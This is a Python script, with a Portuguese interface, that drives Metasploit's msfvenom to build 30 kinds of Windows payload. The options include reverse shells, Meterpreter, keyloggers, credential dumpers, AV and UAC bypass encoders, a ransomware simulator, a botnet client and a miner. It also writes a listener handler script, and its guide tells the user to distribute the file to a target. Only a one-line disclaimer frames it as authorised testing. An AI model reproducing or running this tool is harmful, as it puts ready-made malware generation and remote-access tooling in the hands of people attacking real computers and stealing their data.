#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import random
from pathlib import Path

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢮⡙⠰⣎⡳⣽⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠦⢡⢛⡼⣝⣧⢿⣿⠁⣾⡷⡤⣄⣀⣀⡀⠤⠤⡶⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠹⠌⡆⣏⠾⣝⡾⣿⡇⢸⣿⣝⠣⢆⠀⠀⢀⠠⢻⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣏⠧⣱⣸⣜⣯⢿⣽⡿⢀⣿⡟⣬⠓⠌⢀⠈⠀⡜⡟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣈⣩⠤⢤⢤⣄⡉⠛⠇⣸⣿⡹⢆⠍⠂⢀⠠⠑⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⢦⠣⠞⣥⣻⢾⣿⡷⢢⣉⠓⠯⢜⣈⣄⡠⠤⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡙⢦⢋⡝⡶⣯⣿⣿⠃⣼⣏⢳⠒⡂⠤⠀⠒⠒⣹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢰⣇⠹⡆⢏⡸⢷⣿⣿⡿⢀⣿⡈⡇⠎⡀⠀⠀⠀⢆⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⡹⣌⣕⣫⣝⣯⣷⣿⠃⣼⢷⡙⡌⠒⠀⠀⠀⠐⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⡀⣀⡄⡀⢀⣀⢀⡋⣉⢠⣀⡀⠀⠉⠙⠟⢠⣿⢣⠓⡌⠡⠀⠀⢀⢡⡇⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠸⠱⠹⠟⡼⠏⠧⠫⣗⡽⠻⠰⠄⠀⠀⠀⠀⠈⠙⠣⠭⠤⢁⠤⠤⠖⠚⠀⠈⠁⠀⠀⠀⡀⠀⠀⠀⡀⠀
⠈⣿⡄⢠⣿⡇⠀⣿⢙⡏⢠⣀⣀⡀⠀⣀⣄⣿⡇⢀⣀⣀⢀⣀⠀⣀⡀⢀⡀⣀⣄⡀⡀⢹⡞⢹⡏⢹⡆
⠀⠸⣧⣼⠉⣿⢸⡏⢸⡇⢸⡏⠉⣿⢺⡏⠈⣿⣧⣿⠉⢹⣧⢿⣄⡿⣇⣼⠻⣯⣤⣍⠐⠋⠙⢺⡗⠛⠁
⠀⠀⢿⡟⠀⢹⣿⠀⢸⡇⢸⡇⠀⣿⠘⢷⣤⢿⡇⠻⣦⡼⠏⠘⣿⠃⢻⡟⠰⣦⣬⡿⠁⠀⠀⠈⠁⠀⠀
    """
    print(banner)

def show_menu():
    """Exibe o menu principal com 2 colunas"""
    print("\n" + "="*80)
    print("                     WINDOWS ASSESSMENT PAYLOADS")
    print("="*80)
    
    payloads = [
        "[1] Windows Reverse TCP Shell",
        "[2] Windows Reverse HTTP Shell", 
        "[3] Windows Reverse HTTPS Shell",
        "[4] Windows Bind TCP Shell",
        "[5] Windows Meterpreter Reverse TCP",
        "[6] Windows Meterpreter Reverse HTTP",
        "[7] Windows Meterpreter Reverse HTTPS",
        "[8] Windows PowerShell Reverse TCP",
        "[9] Windows x64 Meterpreter Reverse TCP",
        "[10] Windows DLL Injection Payload",
        "[11] Windows Service Persistence",
        "[12] Windows Registry Backdoor",
        "[13] Windows Keylogger Payload",
        "[14] Windows Screenshot Capture",
        "[15] Windows Audio Recording",
        "[16] Windows Webcam Capture",
        "[17] Windows Credential Dumper",
        "[18] Windows Hash Dumper",
        "[19] Windows Process Hollowing",
        "[20] Windows Memory Injection",
        "[21] Windows Anti-Virus Bypass",
        "[22] Windows UAC Bypass Loader",
        "[23] Windows Ransomware Simulator",
        "[24] Windows Botnet Client",
        "[25] Windows Crypto Miner",
        "[26] Windows Network Sniffer",
        "[27] Windows Port Scanner Loader",
        "[28] Windows Reverse DNS Shell",
        "[29] Windows ICMP Backdoor",
        "[30] Windows Custom Exploit"
    ]
    
    # Mostrar em 2 colunas
    col_width = 40
    for i in range(0, 30, 2):
        line = ""
        # Primeira coluna
        if i < len(payloads):
            line += payloads[i].ljust(col_width)
        # Segunda coluna  
        if i + 1 < len(payloads):
            line += payloads[i + 1]
        print(line)
    
    print("\n[0] Sair")
    print("="*80)

def get_payload_config(payload_type):
    """Obtém configuração do payload"""
    print(f"\nConfigurando Payload Tipo {payload_type}")
    print("-" * 45)
    
    lhost = input("IP do servidor (LHOST): ").strip()
    lport = input("Porta (LPORT) [4444]: ").strip() or "4444"
    
    # Nome padrão baseado no tipo
    default_name = f"windows_payload_{payload_type}"
    output_name = input(f"Nome do arquivo de saída [{default_name}]: ").strip() or default_name
    
    # Adicionar extensão apropriada
    if payload_type in [10, 19, 20]:  # DLLs
        if not output_name.endswith('.dll'):
            output_name += '.dll'
    elif payload_type == 8:  # PowerShell
        if not output_name.endswith('.ps1'):
            output_name += '.ps1'
    else:  # Executáveis
        if not output_name.endswith('.exe'):
            output_name += '.exe'
    
    return lhost, lport, output_name

def generate_payload(payload_type, lhost, lport, output_name):
    """Gera o payload usando msfvenom"""
    
    payload_configs = {
        1: {
            'payload': 'windows/shell/reverse_tcp',
            'format': 'exe',
            'description': 'Reverse TCP Shell para Windows'
        },
        2: {
            'payload': 'windows/shell/reverse_http',
            'format': 'exe', 
            'description': 'Reverse HTTP Shell para Windows'
        },
        3: {
            'payload': 'windows/shell/reverse_https',
            'format': 'exe',
            'description': 'Reverse HTTPS Shell criptografado'
        },
        4: {
            'payload': 'windows/shell/bind_tcp',
            'format': 'exe',
            'description': 'Bind TCP Shell para Windows'
        },
        5: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Meterpreter Reverse TCP'
        },
        6: {
            'payload': 'windows/meterpreter/reverse_http',
            'format': 'exe',
            'description': 'Meterpreter Reverse HTTP'
        },
        7: {
            'payload': 'windows/meterpreter/reverse_https',
            'format': 'exe', 
            'description': 'Meterpreter Reverse HTTPS'
        },
        8: {
            'payload': 'windows/powershell_reverse_tcp',
            'format': 'ps1',
            'description': 'PowerShell Reverse TCP'
        },
        9: {
            'payload': 'windows/x64/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Meterpreter x64 Reverse TCP'
        },
        10: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'dll',
            'description': 'DLL Injection Payload'
        },
        11: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe-service',
            'description': 'Service Persistence Backdoor'
        },
        12: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Registry Persistence'
        },
        13: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Keylogger com Meterpreter'
        },
        14: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Screenshot Capture Module'
        },
        15: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Audio Recording Payload'
        },
        16: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Webcam Capture Module'
        },
        17: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Credential Dumping Tool'
        },
        18: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Hash Dumping Utility'
        },
        19: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Process Hollowing Technique'
        },
        20: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Memory Injection Payload'
        },
        21: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'AV Bypass Technique'
        },
        22: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'UAC Bypass Loader'
        },
        23: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Ransomware Simulation'
        },
        24: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Botnet Client Agent'
        },
        25: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Cryptocurrency Miner'
        },
        26: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Network Traffic Sniffer'
        },
        27: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Port Scanner Loader'
        },
        28: {
            'payload': 'windows/shell/reverse_tcp_dns',
            'format': 'exe',
            'description': 'Reverse DNS Shell'
        },
        29: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'ICMP Covert Channel'
        },
        30: {
            'payload': 'windows/meterpreter/reverse_tcp',
            'format': 'exe',
            'description': 'Custom Exploit Framework'
        }
    }
    
    config = payload_configs.get(payload_type)
    if not config:
        print("❌ Tipo de payload inválido!")
        return False
    
    print(f"\n🎯 Gerando: {config['description']}")
    print("⏳ Aguarde, isso pode levar alguns minutos...")
    
    try:
        # Comando msfvenom base
        cmd = [
            'msfvenom',
            '-p', config['payload'],
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', config['format'],
            '-o', output_name
        ]
        
        # Adicionar técnicas específicas
        if payload_type in [10, 19, 20]:  # Injeção
            cmd.extend(['--arch', 'x86'])
            cmd.append('--encoder')
            cmd.append('x86/shikata_ga_nai')
            
        if payload_type == 11:  # Serviço
            cmd.extend(['-f', 'exe-service'])
            
        if payload_type == 21:  # Bypass AV
            cmd.extend(['-e', 'x86/shikata_ga_nai'])
            cmd.append('-i')
            cmd.append('3')
            
        if payload_type in [22, 23, 24]:  # Técnicas avançadas
            cmd.extend(['--platform', 'windows'])
            cmd.append('--encoder')
            cmd.append('x86/opt_sub')
            
        if payload_type in [25, 26, 27]:  # Malwares
            cmd.extend(['-f', 'exe', '--smallest'])
            
        # Executar comando
        print(f"\n🔧 Executando: msfvenom -p {config['payload']} LHOST={lhost} LPORT={lport}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"\n✅ Payload gerado com sucesso: {output_name}")
            
            # Gerar handler automaticamente
            if generate_handler(payload_type, lhost, lport, output_name, config):
                print("✅ Handler configurado automaticamente")
            
            show_payload_tips(payload_type)
            return True
        else:
            print(f"\n❌ Erro ao gerar payload!")
            print(f"Detalhes: {result.stderr}")
            return False
            
    except FileNotFoundError:
        print("\n❌ Metasploit não encontrado!")
        print("Instale o Metasploit ou adicione ao PATH")
        return False
    except Exception as e:
        print(f"\n❌ Erro inesperado: {str(e)}")
        return False

def generate_handler(payload_type, lhost, lport, output_name, config):
    """Gera arquivo de handler para Metasploit"""
    
    handler_content = f"""# Handler para {output_name}
use exploit/multi/handler
set PAYLOAD {config['payload']}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set EnableStageEncoding true
"""

    # Adicionar configurações específicas
    if payload_type in [2, 6]:
        handler_content += "set LHOST http://" + lhost + "\n"
    elif payload_type in [3, 7]:
        handler_content += "set LHOST https://" + lhost + "\n"
    
    if payload_type in [9, 19, 20]:
        handler_content += "set target 0\n"
        
    if payload_type in [13, 14, 15, 16]:
        handler_content += "set AutoRunScript post/windows/manage/\n"
    
    handler_content += "exploit -j -z\n"
    
    handler_file = f"handler_{output_name.split('.')[0]}.rc"
    
    try:
        with open(handler_file, 'w') as f:
            f.write(handler_content)
        print(f"📁 Handler salvo como: {handler_file}")
        print("💻 Execute com: msfconsole -r " + handler_file)
        return True
    except Exception as e:
        print(f"⚠️  Erro ao criar handler: {str(e)}")
        return False

def show_payload_info(payload_type):
    """Mostra informações sobre o payload selecionado"""
    
    info_texts = {
        1: "Reverse TCP Shell - Conexão reversa básica via TCP",
        2: "Reverse HTTP Shell - Conexão HTTP para bypass de firewall", 
        3: "Reverse HTTPS Shell - Conexão criptografada HTTPS",
        4: "Bind TCP Shell - Abre porta no sistema alvo",
        5: "Meterpreter TCP - Shell avançado com múltiplas funções",
        6: "Meterpreter HTTP - Meterpreter via HTTP",
        7: "Meterpreter HTTPS - Meterpreter criptografado",
        8: "PowerShell TCP - Shell via PowerShell remoto",
        9: "x64 Meterpreter - Meterpreter para sistemas 64-bit",
        10: "DLL Injection - Injeção de DLL em processos",
        11: "Service Persistence - Backdoor como serviço Windows",
        12: "Registry Backdoor - Persistência via registro",
        13: "Keylogger - Captura de teclas digitadas",
        14: "Screenshot - Captura de tela remota",
        15: "Audio Recording - Gravação de áudio do microfone",
        16: "Webcam Capture - Acesso à câmera web",
        17: "Credential Dumper - Extração de credenciais",
        18: "Hash Dumper - Dumping de hashes SAM",
        19: "Process Hollowing - Técnica de evasão avançada",
        20: "Memory Injection - Injeção em memória",
        21: "AV Bypass - Técnicas para evitar detecção",
        22: "UAC Bypass - Contornar User Account Control",
        23: "Ransomware Sim - Simulador de ransomware",
        24: "Botnet Client - Cliente para rede de bots",
        25: "Crypto Miner - Minerador de criptomoedas",
        26: "Network Sniffer - Captura de tráfego de rede",
        27: "Port Scanner - Scanner de portas integrado",
        28: "DNS Shell - Shell via protocolo DNS",
        29: "ICMP Backdoor - Backdoor via ping (ICMP)",
        30: "Custom Exploit - Framework para exploits personalizados"
    }
    
    info = info_texts.get(payload_type, "Informação não disponível")
    print(f"\n📋 Informações do Payload {payload_type}:")
    print(f"   {info}")

def show_payload_tips(payload_type):
    """Mostra dicas específicas para o payload"""
    
    tips = {
        1: "Dica: Use para conexões diretas em redes internas",
        2: "Dica: Ideal para bypass de firewalls corporativos",
        3: "Dica: Recomendado para tráfego externo criptografado",
        4: "Dica: Útil quando não pode receber conexões entrantes",
        5: "Dica: Meterpreter oferece recursos avançados",
        8: "Dica: Execute com: powershell -ExecutionPolicy Bypass -File",
        10: "Dica: Injete com: rundll32 payload.dll,Main",
        11: "Dica: Instale como serviço para persistência",
        13: "Dica: Use keyscan_start no meterpreter para keylogging",
        21: "Dica: Use encoders múltiplos para melhor evasão",
        22: "Dica: Requer privilégios de administrador",
        28: "Dica: Útil em redes com restrições DNS",
        29: "Dica: Covert channel difícil de detectar"
    }
    
    tip = tips.get(payload_type)
    if tip:
        print(f"💡 {tip}")

def show_quick_guide():
    """Mostra um guia rápido de uso"""
    print("\n" + "="*60)
    print("                   GUIA RÁPIDO")
    print("="*60)
    print("1. Escolha um payload da lista")
    print("2. Configure LHOST (seu IP) e LPORT (sua porta)")
    print("3. O script gerará o arquivo malicioso")
    print("4. Um handler automático será criado")
    print("5. Execute: msfconsole -r handler_[arquivo].rc")
    print("6. Distribua o payload para o alvo")
    print("7. Aguarde a conexão no Metasploit")
    print("="*60)

def main():
    """Função principal"""
    
    while True:
        clear_screen()
        print_banner()
        show_menu()
        
        try:
            choice = input("\nSelecione uma opção [0-30] ou 'g' para guia: ").strip()
            
            if choice.lower() == 'g':
                show_quick_guide()
                input("\n⏎ Pressione Enter para voltar ao menu...")
                continue
                
            if choice == '0':
                print("\n👋 Saindo... Use com responsabilidade!")
                break
            
            payload_type = int(choice)
            if 1 <= payload_type <= 30:
                show_payload_info(payload_type)
                
                if input("\n🎯 Continuar com este payload? (s/n): ").lower() == 's':
                    lhost, lport, output_name = get_payload_config(payload_type)
                    
                    if lhost and output_name:
                        print("\n🚀 Iniciando geração do payload...")
                        success = generate_payload(payload_type, lhost, lport, output_name)
                        
                        if success:
                            print("\n✅ Payload criado com sucesso!")
                            print(f"📁 Arquivo: {output_name}")
                            print("⚡ Execute o handler correspondente")
                            print("⚠️  Use apenas para testes legais e autorizados!")
                        else:
                            print("\n💥 Falha na geração do payload!")
                    
                    input("\n⏎ Pressione Enter para continuar...")
            
            else:
                print("❌ Opção inválida!")
                input("⏎ Pressione Enter para continuar...")
                
        except ValueError:
            print("❌ Por favor, digite um número válido!")
            input("⏎ Pressione Enter para continuar...")
        except KeyboardInterrupt:
            print("\n\n👋 Saindo...")
            break

if __name__ == "__main__":
    main()
